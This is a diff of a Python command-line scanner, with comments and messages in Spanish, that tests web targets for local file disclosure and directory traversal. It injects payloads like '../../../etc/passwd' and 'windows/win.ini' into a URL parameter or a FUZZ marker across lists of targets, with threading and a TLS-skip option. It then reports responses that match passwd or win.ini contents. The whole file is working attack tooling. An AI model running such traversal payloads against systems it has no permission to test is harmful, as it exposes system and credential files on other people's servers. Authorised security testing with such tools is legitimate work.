@@ -1,113 +1,294 @@
-# LFDScanner.py
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
 
-import requests
 import argparse
-import logging
-import colorama
-from multiprocessing import Pool
+import requests
+import urllib.parse
+import sys
+import json
+from datetime import datetime
+from concurrent.futures import ThreadPoolExecutor, as_completed
 from colorama import Fore, Style, init
-import re
-import signal
 
 # Inicializar colorama
 init(autoreset=True)
 
-# Configurar logging
-logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
-logger = logging.getLogger(__name__)
 
-# Clase para manejar colores
-class Colores:
-    VERDE = Fore.GREEN
-    ROJO = Fore.RED
-    AMARILLO = Fore.YELLOW
-    RESET = Style.RESET_ALL
+DEFAULT_PATHS = [
+    "../../etc/passwd",
+    "../../../etc/passwd",
+    "../../../../etc/passwd",
+    "../../etc/hosts",
+    "../../../etc/hosts",
+    "../../../../etc/hosts",
+    "../../windows/win.ini",
+    "../../../windows/win.ini",
+    "../../../../windows/win.ini",
+    "../../windows/system32/drivers/etc/hosts",
+    "../../../windows/system32/drivers/etc/hosts",
+    "../../../../windows/system32/drivers/etc/hosts",
+]
 
-def imprimir_banner():
-    """Imprime un banner de bienvenida."""
-    banner = r"""
-  __    ___  ___  __                                 
- / /   / __\/   \/ _\ ___ __ _ _ __  _ __   ___ _ __ 
-/ /   / _\ / /\ /\ \ / __/ _` | '_ \| '_ \ / _ \ '__|
-/ /___/ /  / /_// _\ \ (_| (_| | | | | | | |  __/ |   
-\____/\/  /___,'  \__/\___\__,_|_| |_|_| |_|\___|_|   
-                                                      
-    """
-    print(Colores.VERDE + banner + Colores.RESET)
 
-def test_domain(domain, traversal_paths, headers, timeout):
-    for path in traversal_paths:
+UNIX_SIGNATURES = [
+    "root:x:0:0:",
+    "/bin/bash",
+    "/bin/sh",
+    ":/home/",
+]
+
+WIN_SIGNATURES = [
+    "[extensions]",
+    "[fonts]",
+    "for 16-bit app support",
+    "C:\\WINDOWS\\",
+]
+
+
+def banner():
+    print(f"{Fore.CYAN}tool-lfdscanner{Style.RESET_ALL} - Local File Disclosure & Directory Traversal scanner")
+    print(f"by {Fore.GREEN}TheOffSecGirl{Style.RESET_ALL}\n")
+
+
+def build_targets(args):
+    targets = []
+
+    if args.url:
+        targets.append(args.url.strip())
+
+    if args.list:
+        with open(args.list, "r", encoding="utf-8", errors="ignore") as f:
+            for line in f:
+                line = line.strip()
+                if line and not line.startswith("#"):
+                    targets.append(line)
+
+    clean = []
+    for t in targets:
+        t = t.strip()
+        if not t:
+            continue
+        if not t.startswith("http://") and not t.startswith("https://"):
+            t = "http://" + t
+        clean.append(t)
+
+    if not clean:
+        print(f"{Fore.RED}[!] No se han proporcionado objetivos válidos.{Style.RESET_ALL}")
+        sys.exit(1)
+
+    return list(dict.fromkeys(clean))
+
+
+def load_paths(args):
+    paths = list(DEFAULT_PATHS)
+    if args.paths:
         try:
-            full_url = f"{domain.rstrip('/')}/{path.lstrip('/')}"
-            response = requests.get(full_url, headers=headers, timeout=timeout)
-            response.raise_for_status()
+            with open(args.paths, "r", encoding="utf-8", errors="ignore") as f:
+                for line in f:
+                    line = line.strip()
+                    if line and not line.startswith("#"):
+                        paths.append(line)
+        except OSError as e:
+            print(f"{Fore.RED}[!] No se pudo leer el archivo de rutas: {e}{Style.RESET_ALL}")
 
-            if "root:" in response.text or "localhost" in response.text:
-                logger.info(f"[+] Posible LFD encontrado en {full_url}:\n{response.text[:200]}")
-            else:
-                logger.info(f"[-] No vulnerable con el path {path}")
-        except requests.HTTPError as e:
-            logger.warning(f"[!] Error HTTP al acceder a {full_url}: {e}")
-        except requests.ConnectionError as e:
-            logger.warning(f"[!] Error de conexión al acceder a {full_url}: {e}")
-        except requests.Timeout as e:
-            logger.warning(f"[!] Tiempo de espera agotado al acceder a {full_url}: {e}")
-        except Exception as e:
-            logger.error(f"[!] Error inesperado al acceder a {full_url}: {e}")
+    # dedupe manteniendo orden
+    return list(dict.fromkeys(paths))
 
-def validate_url(url):
-    regex = re.compile(
-        r'^(?:http|ftp)s?://'  # http:// or https://
-        r'(?:(?:[A-Z0-9](?:[A-Z0-9-]{0,61}[A-Z0-9])?\.)+(?:[A-Z]{2,6}\.?|[A-Z0-9-]{2,}\.?)|'  # domain...
-        r'localhost|'  # localhost...
-        r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})'  # ...or ip
-        r'(?::\d+)?'  # optional port
-        r'(?:/?|[/?]\S+)$', re.IGNORECASE)
-    return re.match(regex, url) is not None
 
-def signal_handler(sig, frame):
-    logger.info("Interrupción recibida, deteniendo el escaneo...")
-    exit(0)
+def build_url(base, param_name, path):
+    # Si el usuario ha dejado un marcador FUZZ en la URL, se reemplaza
+    if "FUZZ" in base:
+        return base.replace("FUZZ", urllib.parse.quote(path))
 
-def main():
-    # Configurar los argumentos de línea de comandos
-    parser = argparse.ArgumentParser(description="Prueba Directory Traversal y Local File Disclosure en múltiples dominios.")
-    parser.add_argument("-L", "--list", required=True, help="Ruta al archivo que contiene la lista de dominios.")
-    parser.add_argument("-A", "--agent", default="Mozilla/5.0 (compatible; bounty-checker/1.0; +http://your-hackerone-email)", help="User-Agent para la solicitud.")
-    parser.add_argument("-t", "--timeout", type=int, default=5, help="Tiempo de espera (en segundos) para cada solicitud.")
-    parser.add_argument("-c", "--config", help="Ruta al archivo de configuración.")
+    parsed = urllib.parse.urlparse(base)
+    query = dict(urllib.parse.parse_qsl(parsed.query, keep_blank_values=True))
+
+    # Insertamos/actualizamos el parámetro de prueba
+    query[param_name] = path
+
+    new_query = urllib.parse.urlencode(query, doseq=True)
+    new_parsed = parsed._replace(query=new_query)
+    return urllib.parse.urlunparse(new_parsed)
+
+
+def response_looks_interesting(text):
+    t = text[:5000]  # limitamos para no tragarnos respuestas enormes
+
+    for sig in UNIX_SIGNATURES:
+        if sig in t:
+            return True
+
+    for sig in WIN_SIGNATURES:
+        if sig in t:
+            return True
+
+    # heurística básica si no hay patrones claros
+    if "root:" in t and "/bin" in t:
+        return True
+
+    return False
+
+
+def scan_single_request(session, url, timeout, verify, headers, path, verbose=False):
+    try:
+        resp = session.get(url, timeout=timeout, verify=verify, headers=headers, allow_redirects=True)
+        status = resp.status_code
+        body = resp.text
+
+        if verbose:
+            print(f"{Fore.BLUE}[*]{Style.RESET_ALL} {url} -> {status}")
+
+        if status in (200, 206, 500, 403) and response_looks_interesting(body):
+            snippet = body[:200].replace("\n", " ").replace("\r", " ")
+            return {
+                "url": url,
+                "status": status,
+                "path": path,
+                "snippet": snippet,
+            }
+    except requests.RequestException as e:
+        if verbose:
+            print(f"{Fore.YELLOW}[!] Error solicitando {url}: {e}{Style.RESET_ALL}")
+    return None
+
+
+def scan_target(base_url, paths, args, session, headers):
+    findings = []
+
+    with ThreadPoolExecutor(max_workers=args.threads) as executor:
+        futures = []
+        for p in paths:
+            final_url = build_url(base_url, args.param, p)
+            futures.append(
+                executor.submit(
+                    scan_single_request,
+                    session,
+                    final_url,
+                    args.timeout,
+                    not args.insecure,
+                    headers,
+                    p,
+                    args.verbose,
+                )
+            )
+
+        for fut in as_completed(futures):
+            result = fut.result()
+            if result:
+                findings.append(result)
+                print(
+                    f"{Fore.RED}[+] Posible LFD/Traversal en{Style.RESET_ALL} {result['url']}"
+                )
+                print(f"    path: {result['path']}")
+                print(f"    status: {result['status']}")
+                print(f"    snippet: {result['snippet']}\n")
+
+    return findings
+
+
+def parse_args():
+    parser = argparse.ArgumentParser(
+        description="tool-lfdscanner - Escáner de Local File Disclosure y Directory Traversal."
+    )
+    parser.add_argument(
+        "-u",
+        "--url",
+        help="URL objetivo. Puede contener FUZZ como marcador de inyección.",
+    )
+    parser.add_argument(
+        "-L",
+        "--list",
+        help="Archivo con lista de objetivos (uno por línea).",
+    )
+    parser.add_argument(
+        "--paths",
+        help="Archivo con rutas de traversal personalizadas.",
+    )
+    parser.add_argument(
+        "-p",
+        "--param",
+        default="file",
+        help="Nombre del parámetro a usar cuando no se use FUZZ en la URL (por defecto: file).",
+    )
+    parser.add_argument(
+        "-t",
+        "--timeout",
+        type=int,
+        default=5,
+        help="Timeout en segundos para cada petición (por defecto: 5).",
+    )
+    parser.add_argument(
+        "-T",
+        "--threads",
+        type=int,
+        default=10,
+        help="Número de hilos por objetivo (por defecto: 10).",
+    )
+    parser.add_argument(
+        "-A",
+        "--agent",
+        default="Mozilla/5.0 (compatible; tool-lfdscanner)",
+        help="User-Agent personalizado.",
+    )
+    parser.add_argument(
+        "--insecure",
+        action="store_true",
+        help="Desactivar verificación TLS (equivalente a --insecure en curl).",
+    )
+    parser.add_argument(
+        "--json-output",
+        help="Archivo donde volcar resultados en formato JSON.",
+    )
+    parser.add_argument(
+        "-v",
+        "--verbose",
+        action="store_true",
+        help="Modo verbose.",
+    )
 
     args = parser.parse_args()
 
-    # Imprimir el banner al inicio
-    imprimir_banner()
+    if not args.url and not args.list:
+        parser.error("Debes proporcionar --url o --list.")
 
-    # Configurar el manejador de señales
-    signal.signal(signal.SIGINT, signal_handler)
+    return args
 
-    # Cargar dominios desde el archivo especificado
-    with open(args.list, 'r') as f:
-        domains = [line.strip() for line in f if line.strip()]
 
-    # Validar URLs
-    domains = [domain for domain in domains if validate_url(domain)]
+def main():
+    banner()
+    args = parse_args()
 
-    # Rutas de Directory Traversal comunes
-    traversal_paths = [
-        "../../../../etc/passwd",
-        "../../../../etc/hosts",
-        "../../../../windows/win.ini",
-        "../../../../windows/system32/drivers/etc/hosts"
-    ]
+    targets = build_targets(args)
+    paths = load_paths(args)
 
-    # Configuración de encabezados
-    headers = {
-        "User-Agent": args.agent
-    }
+    headers = {"User-Agent": args.agent}
+    session = requests.Session()
 
-    # Multiprocesamiento
-    with Pool() as pool:
-        pool.starmap(test_domain, [(domain, traversal_paths, headers, args.timeout) for domain in domains])
+    all_findings = {}
 
-if __name__ == "__main__":
+    for target in targets:
+        print(f"{Fore.CYAN}[*] Escanenado objetivo:{Style.RESET_ALL} {target}")
+        findings = scan_target(target, paths, args, session, headers)
+        all_findings[target] = findings
+
+    total_vuln = sum(len(v) for v in all_findings.values())
+    print("\n" + "-" * 60)
+    print(f"{Fore.GREEN}[+] Escaneo completado.{Style.RESET_ALL}")
+    print(f"    Objetivos analizados: {len(targets)}")
+    print(f"    Posibles vulnerabilidades encontradas: {total_vuln}")
+
+    if args.json_output:
+        report = {
+            "generated_at": datetime.utcnow().isoformat() + "Z",
+            "targets": all_findings,
+        }
+        try:
+            with open(args.json_output, "w", encoding="utf-8") as f:
+                json.dump(report, f, indent=2, ensure_ascii=False)
+            print(f"{Fore.GREEN}[+] Resultados JSON guardados en:{Style.RESET_ALL} {args.json_output}")
+        except OSError as e:
+            print(f"{Fore.RED}[!] No se pudo escribir el JSON: {e}{Style.RESET_ALL}")
+
+
+if __name__ == '__main__':
     main()
